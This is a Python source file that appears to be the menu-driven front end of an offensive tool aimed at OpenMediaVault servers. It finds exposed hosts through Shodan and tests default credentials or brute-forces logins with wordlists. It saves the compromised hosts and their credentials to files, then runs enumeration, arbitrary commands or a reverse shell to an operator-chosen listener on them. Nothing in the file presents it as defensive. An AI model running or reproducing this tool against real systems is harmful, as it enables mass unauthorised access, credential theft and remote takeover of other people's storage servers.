import os
from utils.terminal import print_bold, print_colored, input_bold
from core.enums import TARGETACTIONS, COLORS, AUTHACTIONS, ATTACKACTIONS, DEFAULTACTIONS
from utils.file_handler import read_list_file, write_list_file, read_credentials_file, write_credentials_file
from core.shodan import search_open_omv
from core import actions
from datetime import datetime

def _choose_target_action():

    options = {
        1: TARGETACTIONS.SINGLETARGET,
        2: TARGETACTIONS.UPLOADHOSTS,
        3: TARGETACTIONS.UPLOADHOSTSWITHCREDENTIALS,
        4: TARGETACTIONS.SCAN,
        5: DEFAULTACTIONS.NEXTSTEP
    }
    
    print_bold("""[*] Choose a target:
    [1] Add a single target
    [2] Import a file with hosts
    [3] Import a file with hosts and credentials
    [4] Search for open OpenMediaVault instances on Shodan
    [5] Next step""")
    
    while True:
        try:
            user_input = int(input_bold())
            action = options[user_input]
            return action
        except (ValueError, KeyError):
            print_colored("[!] Invalid option!", COLORS.RED)
        
def _choose_auth_action():
    options = {
        1: AUTHACTIONS.TESTDEFAULT,
        2: AUTHACTIONS.BRUTEFORCE,
        3: AUTHACTIONS.USEEXISTING
    }

    print_bold("""[*] Choose an action to execute on selected targets:
    [1] Test default credentials
    [2] Brute force credentials
    [3] Test existing credentials""")

    while True:
        try:
            user_input = int(input_bold())
            action = options[user_input]
            return action
        except (ValueError, KeyError):
            print_colored("[!] Invalid option!", COLORS.RED)

def _choose_attack_action():
    options = {
        1: ATTACKACTIONS.GETSYSTEMINFO,
        2: ATTACKACTIONS.ENUMERATEUSERS,
        3: ATTACKACTIONS.ENUMERATESHAREDFOLDERS,
        4: ATTACKACTIONS.RUNCOMMAND,
        5: ATTACKACTIONS.REVSHELL,
        6: DEFAULTACTIONS.QUIT
    }
    
    print_bold("""[*] Choose an action to run on targets:
    [1] Get system info
    [2] Enumerate users
    [3] Enumerate shared folders
    [4] Run command on host
    [5] Start reverse shell
    [6] Exit""")
    
    while True:
        try:
            user_input = int(input_bold())
            action = options[user_input]
            return action
        except (ValueError, KeyError):
            print_colored("[!] Invalid option!", COLORS.RED)

def _choose_bruteforce_credentials():
    print_bold("""[*] Please insert a username or the path of a wordlist:""")
    username_input = str(input_bold())
    
    print_bold("""[*] Please insert a password or the path of a wordlist:""")
    password_input = str(input_bold())

    return username_input, password_input

def _choose_attack_targets(targets):
    print_bold("[*] All available targets:")
    ordered_target_list = []
    for i, target in enumerate(targets.keys(), start=1):
        print_colored(f"[{i}] {target}", COLORS.CYAN)
        ordered_target_list.append(target)

    selected_targets = {}

    print_bold("Please select the targets you want to attack typing the target number separated by comma or \"*\" to select all available targets. (eg: 1,3,5,6)")
    while True:
        try:
            user_input = input_bold().strip()

            if user_input == '*':
                return targets
            
            if user_input.isnumeric():
                host = ordered_target_list[int(user_input) - 1]
                details = targets[host]
                selected_targets[host] = details
                return selected_targets

            if ',' in user_input:
                selected_target_numbers = [int(t.strip()) -1 for t in user_input.split(',')]
                for id in selected_target_numbers:
                    host = ordered_target_list[id]
                    details = targets[host]
                    selected_targets[host] = details
                    return selected_targets

            print_colored("[!] Invalid option!", COLORS.RED)
        except (ValueError, KeyError):
            print_colored("[!] Invalid option!", COLORS.RED)

def _ask_for_credentials():
    print_bold("""[*] Username:""")
    username_input = str(input_bold())
    
    print_bold("""[*] Password:""")
    password_input = str(input_bold())

    return username_input, password_input

def _get_targets():
    raw_targets = []
    cred_targets = []

    while True:
        choosen_action = _choose_target_action()

        if choosen_action == TARGETACTIONS.SCAN:
            
            print_bold("[*] Enter Shodan API Key:")
            shodan_api_key = input_bold()
            shodan_hosts = search_open_omv(shodan_api_key)

            if not shodan_hosts:
                continue

            raw_targets.extend(shodan_hosts)
        elif choosen_action == TARGETACTIONS.UPLOADHOSTS:
            print_bold("[*] Enter file path:")
            file_lines = read_list_file(input_bold())
            if not file_lines:
                continue

            raw_targets.extend(file_lines)

        elif choosen_action == TARGETACTIONS.SINGLETARGET:
            print_bold("[*] Enter url:")
            raw_targets.append(input_bold())
        
        elif choosen_action == TARGETACTIONS.UPLOADHOSTSWITHCREDENTIALS:
            print_colored("Please make sure your file only contains lines with the following pattern: \n\thttp://host - username:password", COLORS.YELLOW)
            print_bold("[*] Enter file path:")
            file_lines = read_credentials_file(input_bold())
            if not file_lines:
                continue
            
            cred_targets.extend(file_lines)

        elif choosen_action == DEFAULTACTIONS.NEXTSTEP and (not raw_targets and not cred_targets):

            print_colored("[!] Select at least one target before proceeding!", COLORS.RED)
            continue

        elif choosen_action == DEFAULTACTIONS.NEXTSTEP and (raw_targets or cred_targets):
            raw_targets = list(set(raw_targets))
            print_colored(f"[*] {len(raw_targets) + len(cred_targets)} unique targets selected.", COLORS.YELLOW)
            break
        
    return raw_targets, cred_targets

def _test_auth(targets, ctargets):

    success_results = {}
    
    choosen_auth_method = _choose_auth_action()

    if choosen_auth_method == AUTHACTIONS.TESTDEFAULT:

        success_results = actions.test_default_credentials(targets)

    elif choosen_auth_method == AUTHACTIONS.BRUTEFORCE:
        usernames = []
        passwords = []
        
        while True:
            username_input, password_input = _choose_bruteforce_credentials()
 
            if os.path.isfile(username_input):
                usernames = read_list_file(username_input)
            else:
                usernames.append(username_input.strip())

            if os.path.isfile(password_input):
                passwords = read_list_file(password_input)
            else:
                passwords.append(password_input.strip())

            if not usernames or not passwords:
                print_colored("[!] Cannot proceed without usernames/passwords!", COLORS.RED)
                continue

            break
        print_colored(f"[*] Testing bruteforce attack on {len(targets)} selected target(s)", COLORS.CYAN)
        success_results = actions.bruteforce_credentials(targets, usernames, passwords)      
    
    elif choosen_auth_method == AUTHACTIONS.USEEXISTING:
        
        if len(targets) > 0:
            for target in targets:
                print_bold(f"[*] Provide a username/password for target {target}")
                username, password = _ask_for_credentials()
                if actions.test_creds_on_target(target, username, password):
                    success_results[target] = {"username": username, "password": password}
        
        if len(ctargets) > 0:
            for target in ctargets:
                if actions.test_creds_on_target(target['host'], target['username'], target['password']):
                    success_results[target['host']] = {"username": target['username'], "password": target['password']}

    return success_results

def _get_exploitable_targets():

    raw_targets, cred_targets = _get_targets()
    backup_file_folder = os.path.abspath('backup')

    if raw_targets:       
        backup_targets_file_name = f'targets_{datetime.now().strftime("%Y%m%d%H%M%S")}.txt'
        print_colored(f"[*] Creating backup file for targets.", COLORS.WHITE)
        write_list_file(raw_targets, backup_file_folder, backup_targets_file_name)

    exploitable_targets = _test_auth(raw_targets, cred_targets)

    print_colored(f"[!] Found {len(exploitable_targets)} exploitable targets.", COLORS.GREEN if len(exploitable_targets) > 0 else COLORS.YELLOW)

    backup_exploitable_targets_file_name = f'exploitable_targets_{datetime.now().strftime("%Y%m%d%H%M%S")}.txt'

    print_colored(f"[*] Creating backup file for exploitable targets.", COLORS.WHITE)
    write_credentials_file(exploitable_targets, backup_file_folder, backup_exploitable_targets_file_name)

    return exploitable_targets

def _attack_targets(exploitable_targets):
    choosen_attack = _choose_attack_action()

    if choosen_attack == ATTACKACTIONS.GETSYSTEMINFO:
        selected_targets = _choose_attack_targets(exploitable_targets)

        for target, details in selected_targets.items():
            system_info = actions.get_system_info(target, details["username"], details["password"])
            print_bold(f"[*] System info for target: {target}")
            print_colored(system_info, COLORS.WHITE)

    elif choosen_attack == ATTACKACTIONS.ENUMERATEUSERS:
        selected_targets = _choose_attack_targets(exploitable_targets)

        for target, details in selected_targets.items():
            users = actions.get_system_users(target, details["username"], details["password"])
            print_bold(f"[*] Existing users on target: {target}")
            print_colored(users, COLORS.WHITE)
            
    elif choosen_attack == ATTACKACTIONS.ENUMERATESHAREDFOLDERS:
        selected_targets = _choose_attack_targets(exploitable_targets)

        for target, details in selected_targets.items():
            shared_folders = actions.get_shared_folders(target, details["username"], details["password"])
            print_bold(f"[*] Existing shared folders on target: {target}")
            print_colored(shared_folders, COLORS.WHITE)
    
    elif choosen_attack == ATTACKACTIONS.RUNCOMMAND:
        selected_targets = _choose_attack_targets(exploitable_targets)

        print_bold("[*] Please provide the command you want to run on the selected targets:")
        command = input_bold()

        for target, details in selected_targets.items():
            output = actions.run_command_on_target(target, details["username"], details["password"], command)
            print_bold("[*] Command output:")
            if not output:
                output = "No response"
            print_colored(output, COLORS.WHITE)

    elif choosen_attack == ATTACKACTIONS.REVSHELL:
        selected_targets = _choose_attack_targets(exploitable_targets)
        print_bold("[*] LHOST:")
        lhost = input_bold()

        print_bold("[*] LPORT:")
        lport = input_bold()

        for target, details in selected_targets.items():
            print_bold(f"[*] Open a new terminal and start a listener. Press ENTER when you are ready.")
            input()
            print_bold(f"[*] Starting shell on target: {target}")
            actions.run_revshell_on_target(target, details["username"], details["password"], lhost, lport)
    
    elif choosen_attack == DEFAULTACTIONS.QUIT:
        raise KeyboardInterrupt
            
def run():

    exploitable_targets = _get_exploitable_targets()

    while True:
        _attack_targets(exploitable_targets)